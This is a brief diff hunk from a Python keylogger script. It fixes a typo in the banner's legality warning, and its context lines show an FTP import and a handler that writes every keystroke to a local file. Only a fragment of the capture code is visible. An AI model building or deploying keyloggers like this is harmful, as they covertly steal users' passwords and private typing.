@@ -5,7 +5,7 @@ from ftplib import FTP
 from time import sleep
 text_file='test.txt'
 
-print("Python Keylogger by NyanPasuOWO.\nVersion: 1.0.2\nRemember that using this tool do evil is illegal.")
+print("Python Keylogger by NyanPasuOWO.\nVersion: 1.0.2\nRemember that using this tool to do evil is illegal.")
 def OnKeyPress(event):
   fob=open(text_file,'a')
   fob.write(event.Key)
